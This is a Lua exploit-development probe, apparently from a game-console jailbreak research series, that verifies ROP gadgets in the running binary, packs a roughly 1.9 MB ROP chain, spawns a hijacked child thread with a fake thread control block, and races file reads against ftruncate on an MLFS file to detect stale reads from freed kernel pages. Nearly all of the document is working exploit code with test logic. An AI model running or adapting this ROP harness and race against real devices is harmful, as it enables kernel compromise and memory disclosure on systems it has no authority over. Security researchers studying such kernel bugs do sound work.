-- CRASH_CLASS: MODERATE
-- PROBE 1531a: race a kernel read FROM an MLFS file against ftruncate shrinking it
--
-- Context: 1530a closed the shm-pager version of this race clean (120 samples,
-- child live in every quarter, 0 stale bytes). MLFS is a different pager: its
-- pages come from a Sony zone, not the shm object, and 947b only tested a
-- SERIAL truncate (write, truncate through a second fd, read -> 0). This asks
-- the concurrent question. If ftruncate frees a page a read is copying from,
-- the user buffer receives bytes from memory the kernel no longer owns.
--
-- The oracle: page 1 of the file is armed with 0x41, then the file is
-- truncated to 0 (which must release that page) and grown back (which must
-- hand out a fresh zero page). The oracle buffer W is cleared AFTER the
-- release and BEFORE the regrow, so a 0x41 in it can only be pre-truncate
-- content served out of a page the kernel had already freed. Page 0 carries a
-- per-round byte and is the liveness channel.
--
-- The child runs lseek(0)/read(V) then lseek(0x4000)/read(W) in a lap loop.
-- The page size is 0x4000, so the second read needs its own seek: a second
-- 4 KiB read after lseek(0) still lands in page 0 (that was a false positive
-- in 1530a's first run). lseek is 478 on this platform, not 199.
--
-- prior art: probes/phase36_realargs/1529b_copyin_race_shm.lua (native child-ROP harness, packed chain, proven)
-- prior art: probes/phase36_realargs/1528b_native_race_waves.lua (harness; thr_exit(431) frees the slot)
-- prior art: probes/phase23_shm/932b_shm_lifecycle.lua (shm_open 482 + ftruncate 480 + mmap 477 on 14.10)
-- prior art: probes/phase23_shm/933a_shm_unmap_refcount.lua (8 stale mappings unchanged after unlink+close)
-- prior art: probes/phase17_new_vectors/388a_self_header.lua (lseek is 478, SEEK_SET is 0)
-- prior art: probes/phase17_new_vectors/384b_child_write_minimal.lua (child rsp idiom, 431 exit)

print("=== PROBE 1531a: MLFS read vs ftruncate ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function hi_lo(v)
    if type(v) == "table" and v.h then return v.h, v.l end
    return 0, N(v)
end
local function fa(v)
    if v == nil then return "nil" end
    local h, l = hi_lo(v)
    return string.format("0x%08X%08X", h, l)
end

local stub = syscall.pipe.fn_addr
local pidv = N(native.fcall_with_rax(stub, 20))
print("fn_addr=" .. fa(stub) .. " pid=" .. pidv)

local sc_mmap   = mk(477)
local sc_593    = mk(593)
local sc_thr    = mk(455)
local sc_ftrunc = mk(480)
local sc_open   = mk(5)
local sc_read   = mk(3)
local sc_write  = mk(4)
local sc_lseek  = mk(478)
-- two scratch buffers: one byte for the liveness byte, one page for the marker
local B1 = N(memory.alloc(8))
pcall(function() memory.write_buffer(B1, "\0\0\0\0\0\0\0\0") end)
local BM = N(memory.alloc(0x4000))
local function pageof(str)
    if #str == 1 then memory.write_byte(B1, str:byte(1)); return B1 end
    memory.write_buffer(BM, str); return BM
end

-- [A] gadgets
print("")
print("[A] gadget verification")
local info = memory.alloc(0x200)
wd(N(info), 0x160)
pcall(function() sc_593(uint64(0), info) end)
local elo = rd(N(info) + 0x108)
local ehi = rd(N(info) + 0x10C)
if not elo or not ehi then print("ABORT: no eboot base"); return end
local eboot = uint64(string.format("0x%X%08X", ehi, elo))
local sb0 = N(eboot)
print("eboot=" .. fa(eboot))

local function bytes_at(off, n)
    local out = {}
    for i = 0, n - 1 do
        local w = rd(sb0 + off + (i - (i % 4)))
        if not w then return nil end
        out[i + 1] = math.floor(w / 2 ^ ((i % 4) * 8)) % 256
    end
    return out
end
local function verifies(off, sig)
    local b = bytes_at(off, #sig)
    if not b then return false end
    for i = 1, #sig do if b[i] ~= sig[i] then return false end end
    return true
end

local off_rax, off_rdi, off_rsi, off_rdx, off_ret, off_rsp = nil, nil, nil, nil, nil, nil
if verifies(0x992,    {0x58, 0xC3}) then off_rax = 0x992 end
if verifies(0xC9DFE,  {0x5F, 0xC3}) then off_rdi = 0xC9DFE end
if verifies(0xD77D,   {0x5E, 0xC3}) then off_rsi = 0xD77D end
if verifies(0x3B02D7, {0x5A, 0xC3}) then off_rdx = 0x3B02D7 end
if verifies(0x42,     {0xC3})       then off_ret = 0x42 end
if verifies(0x9A2,    {0x5C, 0xC3}) then off_rsp = 0x9A2 end
print(string.format("  pop_rax=%s pop_rdi=%s pop_rsi=%s pop_rdx=%s ret=%s pop_rsp=%s",
    off_rax and "OK" or "NONE", off_rdi and "OK" or "NONE",
    off_rsi and "OK" or "NONE", off_rdx and "OK" or "NONE",
    off_ret and "OK" or "NONE", off_rsp and "OK" or "NONE"))
if not (off_rax and off_rdi and off_rsi and off_rdx and off_ret) then
    print("ABORT: gadget set incomplete"); return
end
local g_rax = eboot + off_rax
local g_rsi = eboot + off_rsi
local g_rdx = eboot + off_rdx
local g_ret = eboot + off_ret

-- [B] shm object, its mapping, and the read destination
print("")
print("[B] MLFS file")
-- 947a established that /av_contents/content_tmp/ is a writable MLFS path with
-- full open/write/lseek/ftruncate. MLFS keeps its pages in a zone of its own,
-- so its truncate path is a different release path from the shm pager that
-- 1530a covered -- if a truncate frees a page a read is copying from, this is
-- where it would show.
local SHMSZ = 0x8000   -- two 16 KiB pages
local base = "/av_contents/content_tmp/"
local path = base .. "r1531.bin"
local pathbuf = memory.alloc(0x80)
pcall(function() memory.write_byte(pathbuf, 0) end)
-- write the NUL-terminated path bytes
for i = 1, #path do
    pcall(function() memory.write_byte(pathbuf + (i - 1), path:byte(i)) end)
end
pcall(function() memory.write_byte(pathbuf + #path, 0) end)
local sc_unlink2 = mk(10)
pcall(function() sc_unlink2(pathbuf) end)

local okf, rfd = pcall(function() return sc_open(pathbuf, uint64(0x202), uint64(0x1FF)) end)
local filefd = okf and N(rfd) or -999
print(string.format("  open(%s, O_CREAT|O_RDWR) -> %d", path, filefd))
if filefd < 0 then print("ABORT: no file"); return end
local oktr, rtr = pcall(function() return sc_ftrunc(uint64(filefd), uint64(0x8000)) end)
print(string.format("  ftruncate(%d, 0x8000) rv=%s", filefd, tostring(oktr and N(rtr) or "err")))
if not oktr or N(rtr) ~= 0 then print("ABORT: ftruncate failed"); return end

-- The child needs its OWN descriptor. Offsets are per open file description,
-- so sharing one with arm() lets arm()'s lseek(0x4000) land between the child's
-- lseek(0) and its read -- which is exactly what the first run looked like
-- (V holding 0x41 instead of the round byte: "dead" samples).
local okc2, rfd2 = pcall(function() return sc_open(pathbuf, uint64(0x202), uint64(0x1FF)) end)
local cfilefd = okc2 and N(rfd2) or -999
print(string.format("  child descriptor -> %d", cfilefd))
if cfilefd < 0 then print("ABORT: no child descriptor"); return end

local SAFE = "abcdefghijklmnopqrstuvwxyz0123456789"
local function round_byte(r) return SAFE:byte((r % #SAFE) + 1) end
-- Arm the file: byte at offset 0 is this round's liveness byte, page 1 is 0x41.
-- page 0 is 16 KiB (0x4000), so page 1 starts at 0x4000.
local MARK = string.rep("A", 0x4000)
local function arm(b)
    pcall(function() sc_lseek(uint64(filefd), uint64(0), uint64(0)) end)
    pcall(function() sc_write(uint64(filefd), uint64(pageof(string.char(b))), uint64(1)) end)
    pcall(function() sc_lseek(uint64(filefd), uint64(0x4000), uint64(0)) end)
    pcall(function() sc_write(uint64(filefd), uint64(pageof(MARK)), uint64(0x4000)) end)
end
local vrv = sc_mmap(uint64(0), uint64(0x4000), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
local V = N(vrv)
print("  destination mmap -> " .. fa(vrv))
if V < 0x10000 then print("ABORT: no destination"); return end
-- both destinations start ZERO so that the first successful read is itself the
-- positive control: W must turn into the marker page, V must stop being zero
pcall(function() memory.write_buffer(V, string.rep("\0", 0x4000)) end)
-- W is the leak channel. The child reads page 0 into V (liveness: page 0 is
-- never freed, so V always carries this round's byte) and page 1 into W (the
-- oracle: page 1 is freed every round, so anything but 0x00 in W came from a
-- page the kernel had already released).
local w2rv = sc_mmap(uint64(0), uint64(0x4000), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
local W2 = N(w2rv)
print("  control channel mmap -> " .. fa(w2rv))
if W2 < 0x10000 then print("ABORT: no control channel"); return end
local wrv = sc_mmap(uint64(0), uint64(0x4000), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
local W = N(wrv)
print("  leak channel mmap -> " .. fa(wrv))
if W < 0x10000 then print("ABORT: no leak channel"); return end
pcall(function() memory.write_buffer(W, string.rep("\0", 0x4000)) end)
print("  both destinations zeroed")
-- prove the file really took the marker before racing on it
arm(string.byte("A"))
local okv0, v0 = pcall(function()
    sc_lseek(uint64(filefd), uint64(0x4000), uint64(0))
    return sc_read(uint64(filefd), uint64(V), uint64(0x1000))
end)
print("  marker readback bytes=" .. tostring(okv0 and N(v0) or "err"))

local okm2, mv = pcall(function() return memory.read_buffer(V, 0x1000) end)
local marker_ok = okv0 and N(v0) == 0x1000 and okm2 and type(mv) == "string"
    and mv == string.rep("A", 0x1000)
print("  marker readback lands 0x41 in V: " .. tostring(marker_ok))
if not marker_ok then print("ABORT: the file did not take the marker"); return end
-- [B2] does a truncate(0)/regrow cycle actually hand back a ZERO page? If the
-- filesystem preserves the old content across the truncate, the oracle below
-- cannot distinguish a stale page from a live one, and the race is untestable
-- this way. 947b only tested the serial truncate-and-read (which returns 0 bytes
-- because the length is 0), never truncate-then-grow-then-read.
do
    pcall(function() memory.write_buffer(W, string.rep("\0", 0x1000)) end)
    pcall(function() sc_ftrunc(uint64(filefd), uint64(0x4000)) end)
    pcall(function() sc_ftrunc(uint64(filefd), uint64(SHMSZ)) end)
    local okr, rv2 = pcall(function()
        sc_lseek(uint64(filefd), uint64(0x4000), uint64(0))
        return sc_read(uint64(filefd), uint64(W), uint64(0x1000))
    end)
    local okw, sw2 = pcall(function() return memory.read_buffer(W, 0x1000) end)
    local preserved = okw and type(sw2) == "string" and sw2:find("A", 1, true) ~= nil
    print(string.format("  [B2] truncate(0x4000)->grow->read page 1: bytes=%s preserved_marker=%s",
        tostring(okr and N(rv2) or "err"), tostring(preserved)))
    if preserved then
        print("  oracle unusable: the filesystem keeps the old page across truncate+grow,")
        print("  so a 0x41 after the regrow cannot prove a page was served from the free list.")
        print("  VERDICT VOID (instrument limit, not a result)")
        return
    end
    -- [B2] truncated and regrew the file, which wiped the marker: re-arm it
    arm(string.byte("A"))
end

-- leave offsets 0 and 0x4000 where they are; arm() seeks before every write

-- [C] child chain: lseek(fd,0,SEEK_SET); read(fd,V,0x1000); repeat
print("")
print("[C] child chain")
local LAPS  = 12000       -- each lap is two lseeks and two reads
local READS = 1
-- 7 qwords per lseek (pop_rsi,0,pop_rdx,0,pop_rax,478,stub)
-- 7 qwords per read  (pop_rsi,V,pop_rdx,0x1000,pop_rax,3,stub)
local nq = 9 + LAPS * 28 + 3
local need = 0x4000 + nq * 8 + 0x1000
local alloc = math.ceil(need / 0x4000) * 0x4000
-- the chain is ~1.9 MB, which is too big for memory.alloc: 1530a's first run
-- faulted 0xD0 bytes into the write_buffer copy (ERRTRAP=0x60E, FAULT=dest+0xD0)
-- because the Lua heap block ended there. An explicit anon mmap is contiguous
-- and its size is exactly what was asked for.
local srv = sc_mmap(uint64(0), uint64(alloc), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
local sbase = N(srv)
print("  stack mmap -> " .. fa(srv) .. string.format(" need=%d alloc=%d", need, alloc))
if sbase < 0x10000 then print("ABORT: no stack mapping"); return end
local rsp = sbase + 0x4000 - 8

local function packq(v)
    local h, l = hi_lo(v)
    return string.char(l % 256, math.floor(l / 256) % 256,
        math.floor(l / 65536) % 256, math.floor(l / 16777216) % 256,
        h % 256, math.floor(h / 256) % 256,
        math.floor(h / 65536) % 256, math.floor(h / 16777216) % 256)
end
local parts = {}
local function put(v) parts[#parts + 1] = packq(v) end

-- F6 from Review1530a: the syscall stub's error path stores errno through
-- %fs:0, so ONE -1 return kills the child inside libkernel. A pager error
-- while the read walks a page the shrink just released is exactly the event
-- this probe is looking for, and without a TCB it would be reported as a
-- dead child. Install a fake FSBASE first, exactly as 384b does.
-- The TCB goes in page 0 of the same anon stack mapping (rsp is at the END of
-- page 0 and the chain grows upward from there, so page 0 is unused). Doing it
-- with memory.alloc instead hung main before it could even print "chain
-- qwords": the Lua heap was already holding ~168k chain strings.
print("  building TCB")
local tcb = sbase
for i = 0, 0x1FF do wq(tcb + i * 8, uint64(tcb)) end
local fs_ptr = sbase + 0x1000
wq(fs_ptr, uint64(tcb))
print(string.format("  TCB at %#x fs_ptr at %#x", tcb, fs_ptr))

local chain_start = rsp
put(uint64(eboot + off_rdi)); put(uint64(129))          -- AMD64_SET_FSBASE
put(uint64(eboot + off_rsi)); put(uint64(fs_ptr))
put(uint64(eboot + off_rax)); put(uint64(165)); put(uint64(stub))
put(uint64(eboot + off_rdi)); put(uint64(cfilefd))
for i = 1, LAPS do
    -- One lap rewinds to offset 0 and reads page 0 then page 1. A flat run
    -- of reads would hit EOF after 16 reads and stop touching the pager, and a
    -- pop-rsp restart is not available: Rev1530a2 showed the C syscall stub's
    -- own pushes land on chain qwords, so restarting re-executes slots that
    -- have been overwritten (that is the RIP=0 death at err/trap 0x140e).
    put(g_rsi); put(uint64(0))
    put(g_rdx); put(uint64(0))
    put(g_rax); put(uint64(478)); put(uint64(stub))   -- lseek(fd,0,SEEK_SET)
    -- sequential reads after the rewind: the first lands in V (page 0), the
    -- second in W (page 1, the page the truncate frees).
    put(g_rsi); put(uint64(V))
    put(g_rdx); put(uint64(0x1000))
    put(g_rax); put(uint64(3)); put(uint64(stub))     -- read(fd,V,0x1000)
    -- The page size is 0x4000, so a second 0x1000 read would still land in
    -- page 0 and W would receive the liveness byte (that is exactly the
    -- false positive the first run reported: "0x62 0x62 0x62 0x62 0x62").
    put(g_rsi); put(uint64(0x4000))
    put(g_rdx); put(uint64(0))
    put(g_rax); put(uint64(478)); put(uint64(stub))   -- lseek(fd,0x4000,SEEK_SET)
    put(g_rsi); put(uint64(W))
    put(g_rdx); put(uint64(0x1000))
    put(g_rax); put(uint64(3)); put(uint64(stub))     -- read(fd,W,0x1000)
end
-- The child exits cleanly when the laps are done. It must outlive the main
-- loop: a flat 12000-read chain finished by round 185 of 3000.
put(g_rax); put(uint64(431)); put(uint64(stub))       -- thr_exit(0)
print("  concatenating " .. tostring(#parts) .. " qwords")
local blob = table.concat(parts)
parts = nil
print(string.format("  chain qwords=%d bytes=%d alloc=%d stack=%s",
    #blob / 8, #blob, alloc, fa(uint64(sbase))))
if 0x4000 - 8 + #blob > alloc then
    print(string.format("ABORT: chain %d bytes does not fit %d after rsp+0x3ff8", #blob, alloc))
    return
end
local okw = pcall(function() memory.write_buffer(rsp, blob) end)
if not okw then print("ABORT: chain write failed"); return end
-- A chain that reaches a zero qword rets into address 0 and dies with SIGSEGV
-- at RIP=0 (err/trap 0x140e), which is indistinguishable from a kernel bug in
-- the fault record. Both ends are checked after the write, and a mismatch is
-- fatal rather than a warning.
local okh, head8 = pcall(function() return memory.read_buffer(rsp, 8) end)
local okt, tail8 = pcall(function() return memory.read_buffer(rsp + #blob - 8, 8) end)
local head_ok = okh and type(head8) == "string" and head8 == blob:sub(1, 8)
local tail_ok = okt and type(tail8) == "string" and tail8 == blob:sub(#blob - 7)
print(string.format("  chain write head_ok=%s tail_ok=%s", tostring(head_ok), tostring(tail_ok)))
if not head_ok or not tail_ok then
    print("  ABORT: the chain did not land intact -- a zero qword would ret into 0")
    return
end
blob = nil

local pa = memory.alloc(0x40)
for i = 0, 7 do wq(N(pa) + i * 8, uint64(0)) end
local ctid = memory.alloc(8)
wd(N(ctid), 0)
wq(N(pa) + 0x00, uint64(g_ret))
wq(N(pa) + 0x10, uint64(sbase))
wq(N(pa) + 0x18, uint64(0x4000))
wq(N(pa) + 0x30, uint64(N(ctid)))

-- [D] race: arm, release, regrow, sample the two destinations
print("")
print("[D] race")
local ok_sp, rsp_ = pcall(function() return sc_thr(uint64(N(pa)), uint64(0x38)) end)
print(string.format("  thr_new rv=%s child_tid=%s", tostring(ok_sp and N(rsp_) or "err"), tostring(rd(N(ctid)))))
if not ok_sp or N(rsp_) ~= 0 then print("ABORT: no child"); return end

-- positive control: without the child running, every later "clean" result
-- would be a triply-empty negative
local function spin(n) local x = 0 for i = 1, n do x = x + i % 7 end return x end
spin(200000)
-- the child reads page 0 into V (byte 0 = the arm byte, rest zeros) and page 1
-- into W (the marker page, all 0x41). The oracle channel is W, so W must hold
-- the marker page before any truncate runs -- otherwise every later "clean"
-- result is a triply-empty negative.
local okc, sc = pcall(function() return memory.read_buffer(W, 0x1000) end)
local okd, sd = pcall(function() return memory.read_buffer(V, 0x1000) end)
local ctrl = okc and type(sc) == "string" and sc == string.rep("A", 0x1000)
local live = okd and type(sd) == "string" and #sd == 0x1000
print(string.format("  positive control: oracle channel holds the marker page = %s", tostring(ctrl)))
print(string.format("  positive control: liveness channel delivered = %s", tostring(live)))
if not (ctrl and live) then print("ABORT: the child never copied anything"); return end

local ROUNDS = 60
local CYCLES = 2
local foreign, sampled, firstbad, dead = 0, 0, "", 0
local liveq = {0, 0, 0, 0}
local mainreads, mainnz, skipped, trunc_fail, arm_fail, otherbad = 0, 0, 0, 0, 0, 0
-- a failed truncate turns the verdict inside out: a failed release leaves the
-- marker page live (false FOREIGN), a failed regrow leaves it beyond EOF (a
-- false clean). Capture every return value.
local function rvtr2(len)
    local ok, rv = pcall(function() return sc_ftrunc(uint64(filefd), uint64(len)) end)
    return ok and N(rv) == 0
end
local quart = math.max(1, math.floor(ROUNDS / 4))
local ZERO = string.rep("\0", 0x1000)
local function sample_once(r, c, b, ch)
    local okv, sv = pcall(function() return memory.read_buffer(V, 0x1000) end)
    local okw, sw = pcall(function() return memory.read_buffer(W, 0x1000) end)
    if not (okv and okw and type(sv) == "string" and type(sw) == "string"
            and #sv == 0x1000 and #sw == 0x1000) then return end
    sampled = sampled + 1
    -- liveness: page 0 is live and carries this round's byte
    if sv:find(ch, 1, true) then
        local q = math.floor((r - 1) / quart) + 1
        if q > 4 then q = 4 end
        liveq[q] = liveq[q] + 1
    else
        dead = dead + 1
    end
    -- oracle: W was cleared AFTER the release and BEFORE the regrow, so the
    -- only way a 0x41 reaches it is a read that returned the pre-truncate
    -- content of a page the kernel had already freed.
    local bad, pos = 0, 1
    while true do
        local q2 = sw:find("[^%z]", pos)
        if not q2 then break end
        if sw:byte(q2) ~= 0x41 then otherbad = otherbad + 1 end
        bad = bad + 1
        if firstbad == "" then
            local lo = q2 - 4; if lo < 1 then lo = 1 end
            local hi = q2 + 4; if hi > #sw then hi = #sw end
            local hex = {}
            for i = lo, hi do hex[#hex + 1] = string.format("%02X", sw:byte(i)) end
            firstbad = string.format("round %d cycle %d byte %d: %s", r, c, q2, table.concat(hex, " "))
        end
        pos = q2 + 1
        if bad > 64 then break end
    end
    foreign = foreign + bad
end
for r = 1, ROUNDS do
    local b = round_byte(r)
    local ch = string.char(b)
    for c = 1, CYCLES do
        -- fresh zero pages, then arm: offset 0 = this round's byte (liveness),
        -- page 1 = 0x41 (the marker that a released page must never return).
        local f1 = rvtr2(SHMSZ)
        arm(b)
        -- F2: prove the marker actually landed before releasing it. Without
        -- this, a cycle whose 0x4000 write silently failed looks exactly like
        -- a cycle whose page was correctly cleared.
        local okA, sA = pcall(function()
            sc_lseek(uint64(filefd), uint64(0x4000), uint64(0))
            return sc_read(uint64(filefd), uint64(W2), uint64(0x1000))
        end)
        local armed = false
        if okA and N(sA) == 0x1000 then
            local ok3, s3 = pcall(function() return memory.read_buffer(W2, 0x1000) end)
            if ok3 and type(s3) == "string" and not s3:find("[^A]") then armed = true end
        end
        if not armed then arm_fail = arm_fail + 1 end
        -- release page 1 ONLY: truncating to 0 would also wipe page 0, which
        -- carries the liveness byte, and then no sample could prove the child
        -- was reading at all (that is what the truncate-to-0 version measured:
        -- 64 of 65 samples "dead", i.e. it raced nothing).
        local f2 = rvtr2(0x4000)
        if not (f1 and f2 and armed) then trunc_fail = trunc_fail + 1 end
        -- clear the oracle buffer AFTER the release: a legitimate read of the
        -- still-live marker page cannot then be mistaken for a stale copy
        pcall(function() memory.write_buffer(W, ZERO) end)
        -- regrow: page 1 must come back as a fresh zero page
        local f3 = rvtr2(SHMSZ)
        if not f3 then trunc_fail = trunc_fail + 1 end
        pcall(function() memory.write_buffer(W2, ZERO) end)
        local okm, mrv = pcall(function()
            sc_lseek(uint64(filefd), uint64(0x4000), uint64(0))
            return sc_read(uint64(filefd), uint64(W2), uint64(0x1000))
        end)
        local ctrl_zero = false
        if okm and N(mrv) > 0 then
            mainreads = mainreads + 1
            local ok2, s2 = pcall(function() return memory.read_buffer(W2, 0x1000) end)
            if ok2 and type(s2) == "string" then
                if not s2:find("[^%z]") then
                    ctrl_zero = true
                else
                    mainnz = mainnz + 1
                end
            end
        end
        spin(200)
        -- GATE: only sample when the main thread's own read of page 1, taken
        -- after the regrow, came back zero. MLFS does not reliably clear pages
        -- across truncate(0)+grow (see the control counts), so when the live
        -- page still holds the marker a 0x41 in the child's buffer proves
        -- nothing. This is what makes the surviving samples mean anything.
        if ctrl_zero then
            sample_once(r, c, b, ch)
        else
            skipped = skipped + 1
        end
    end
    if r % 10 == 0 then
        print(string.format("  round %d sampled=%d dead=%d foreign=%d", r, sampled, dead, foreign))
    end
end
print(string.format("  rounds=%d cycles=%d samples=%d dead=%d foreign_bytes=%d",
    ROUNDS, CYCLES, sampled, dead, foreign))
print(string.format("  child delivered per quarter: %d %d %d %d (of %d each)",
    liveq[1], liveq[2], liveq[3], liveq[4], quart * CYCLES))
if firstbad ~= "" then print("  first foreign: " .. firstbad) end
print(string.format("  truncate failures: %d of %d cycles, arm failures: %d",
    trunc_fail, ROUNDS * CYCLES, arm_fail))
print(string.format("  non-marker bytes in the oracle channel: %d", otherbad))
print(string.format("  control: main read page 1 after regrow %d times, non-zero %d of them, skipped %d",
    mainreads, mainnz, skipped))

-- [E] verdict
print("")
print("[E] verdict")
if sampled == 0 then
    print("  VERDICT VOID: the destination page could not be read back")
elseif trunc_fail > 0 then
    print(string.format("  VERDICT VOID: %d of %d cycles had a truncate fail, so neither a",
        trunc_fail, ROUNDS * CYCLES))
    print("  foreign byte nor a clean result from this run means anything")
elseif foreign > 0 then
    print("  *** FOREIGN BYTES IN THE READ DESTINATION ***")
    print("  the kernel copied out of a page it had already released")
elseif dead > 0 then
    print(string.format("  VERDICT VOID: %d of %d samples held no byte from this round, so the",
        dead, sampled))
    print("  child was not delivering for those rounds and they raced nothing")
else
    print(string.format("  clean: %d samples of %#x bytes, %d with no live byte (raced nothing)",
        sampled, 0x1000, dead))
    print("  page 0 (liveness) holds this round's byte, page 1 (oracle) all 0x00")
end
print("  final pid=" .. tostring(N(native.fcall_with_rax(stub, 20))) .. " expected " .. tostring(pidv))
print("")
print("=== PROBE 1531a COMPLETE ===")
